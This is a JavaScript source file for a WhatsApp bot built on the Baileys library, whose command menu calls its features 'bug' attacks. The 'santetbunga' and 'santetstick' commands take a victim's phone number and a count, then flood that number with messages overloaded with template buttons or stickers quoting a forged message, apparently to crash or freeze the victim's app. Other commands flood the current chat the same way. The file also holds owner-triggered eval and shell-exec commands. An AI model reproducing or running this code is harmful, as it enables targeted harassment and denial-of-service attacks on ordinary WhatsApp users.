require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const os = require('os')
const mathjs = require('mathjs')
const chalk = require('chalk')
const cl = require('caliph-api') 
const axios = require('axios')
const path = require('path')
const mel = require('kitsune-api')
const moment = require('moment-timezone')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { exec, spawn, execSync } = require("child_process")
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins } = require('./medias/lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const qtod = m.quoted? "true":"false"
//=================================================//
let picaks = [flaming,fluming,flarun,flasmurf]
let picak = picaks[Math.floor(Math.random() * picaks.length)]
//=================================================//
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam'
 }
moment.tz.setDefault("Asia/Jakarta").locale("id");
//=================================================//
module.exports = cann = async (cann, m, chatUpdate, store) => {
 try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
//=================================================//
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await cann.decodeJid(cann.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const from = mek.key.remoteJid
const groupMetadata = m.isGroup ? await cann.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
} else global.db.data.chats[m.chat] = {
mute: false,
}
let settings = db.data.settings[botNumber]
if (typeof settings !== 'object') db.data.settings[botNumber] = {}
if (settings) {
if (!('available' in settings)) settings.available = true
if (!('composing' in settings)) settings.composing = false
if (!('recording' in settings)) settings.recording = false
} else db.data.settings[botNumber] = {
available: true,
composing: false,
recording: false,
}
} catch (err) {
console.log(err)
}
//=================================================//
if (!cann.public) {
if (!m.key.fromMe) return
}
if (m.message) {
console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32m CMD \x1b[1;37m]', chalk.
green(), 'from', chalk.green(pushname), 'in', chalk.green(groupName ? groupName : 'Private Chat' ), 'args :', chalk.green(text.length))
 }
//=================================================// 
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
//=================================================// 
   // autovn
if(autorecording){
if(autorecording == false)
await cann.sendPresenceUpdate('recording', m.chat)
} else if(autoketik){
if(autoketik == false)
await cann.sendPresenceUpdate('composing', m.chat)
} else if(autoavailable){
if(autoavailable == true)
await cann.sendPresenceUpdate('available', m.chat)
}
//=================================================//
// Mute Chat
if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
return
}
//=================================================//
//=================================================//
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: cann.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, cann.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
cann.ev.emit('messages.upsert', msg)
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) return
if (isBan) throw sticBanLu(from)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) {

case 'bungapc': {
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
cannx = `By Carosatzx`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(m.chat, { text: '', templateButtons: [
{ callButton: { displayText: ``, phoneNumber: ''}},
{ callButton: { displayText: ``, phoneNumber: ''}},
{ urlButton: { displayText: `TheCarosatzx`, url: 'https://wa.me/573177111111'}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
]})
}
}
break
/*
case '': {
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
cannx = `By Carosatzx`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(m.chat, { sticker: fs.readFileSync('./src/stick.webp'), templateButtons: [
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ urlButton: { displayText: `TheCarosatzx`, url: '666'}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
]})
}
}
break
*/
/============================================/
case 'santetbunga': {
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888xxxx|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
cannx = `By Carosatzx 666`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(`${num}@s.whatsapp.net`, { text: 'TheCarosatzx', templateButtons: [
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ urlButton: { displayText: `TheCarosatzx`, url: '666'}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
]})
}
}
break
/============================================/
case 'santetstick': {
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888xxxx|1|10s\n\n\ns = Second/Detik\n\n`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
cannx = `By Carosatzx 666`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(`${num}@s.whatsapp.net`, {sticker: fs.readFileSync('./src/stick.webp')},{quoted: {
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
}
break
/============================================/
case 'stickpc': {
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
cannx = `By Carosatzx`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(m.chat, {sticker: fs.readFileSync('./src/stick.webp')},{quoted: {
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
}
break
/============================================/
case 'stick2pc': {
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
cannx = `By Carosatzx`
for (let i = 0; i < jumlah; i++) {
cann.sendMessage(m.chat, { sticker: fs.readFileSync('./src/stick.webp'), templateButtons: [
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
]},{ quoted: {
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
key: { 
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
}
}
break


case 'imagepc': {
cannx = `By Carosatzx 666`
cann.sendMessage(m.chat, { image: fs.readFileSync('./src/menu.jpg'), caption: `hallo`, templateButtons: [
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ callButton: { displayText: ``, phoneNumber: '666'}},
{ urlButton: { displayText: `TheCarosatzx`, url: '666'}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
{ quickReplyButton: { displayText: `${cannx}`, id: ''}},
]})
}
break
/============================================/
case 'bugmenu': {
cann.sendMessage(m.chat, { text: `─✪「ALL MENU」✪
│⧉ .stickpc [Jumlah]
│⧉ .bungapc [Jumlah]
│⧉ .santetstick [Nomor|Jumlah]
│⧉ .santetbunga[Nomor|Jumlah]
└─❶

╭─✪「𝗔𝗕𝗢𝗨𝗧」✪
│⧉ Create By KenZ
│⧉ Version 3.0
└─❷`,
})
}
break

/============================================/
default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return m.reply(bang)}
try {
m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
m.reply(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return sticOwner(from)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))}}
if (budy.startsWith('$')) {
if (!isCreator) return 
exec(budy.slice(2), (err, stdout) => {
if(err) return m.reply(err)
if (stdout) return m.reply(stdout)})}
//=================================================//
//=================================================//
if (isCmd && budy.toLowerCase() != undefined) {
if (m.chat.endsWith('broadcast')) return
if (m.isBaileys) return
let msgs = global.db.data.database
if (!(budy.toLowerCase() in msgs)) return
cann.copyNForward(m.chat, msgs[budy.toLowerCase()], true)}}
} catch (err) {
m.reply(util.format(err))}}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})